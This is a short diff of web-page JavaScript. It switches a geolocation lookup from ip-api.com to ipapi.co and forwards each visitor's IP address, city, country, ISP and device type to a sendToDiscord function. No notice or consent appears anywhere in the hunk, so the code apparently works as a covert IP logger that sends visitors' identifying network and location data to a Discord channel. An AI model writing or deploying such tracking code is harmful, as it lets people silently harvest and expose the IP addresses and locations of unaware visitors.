@@ -525,16 +525,16 @@
             time: new Date().toISOString()
         };
 
-        fetch('https://ip-api.com/json/?fields=status,query,country,city,isp,mobile')
+        fetch('https://ipapi.co/json/')
             .then(function (r) { return r.json(); })
             .then(function (geo) {
-                if (geo && geo.status === 'success') {
+                if (geo && !geo.error && geo.ip) {
                     sendToDiscord(visitorData, {
-                        ip: geo.query,
+                        ip: geo.ip,
                         city: geo.city,
-                        country_name: geo.country,
-                        org: geo.isp,
-                        mobile: geo.mobile
+                        country_name: geo.country_name,
+                        org: geo.org,
+                        mobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
                     });
                 } else {
                     sendToDiscord(visitorData, null);
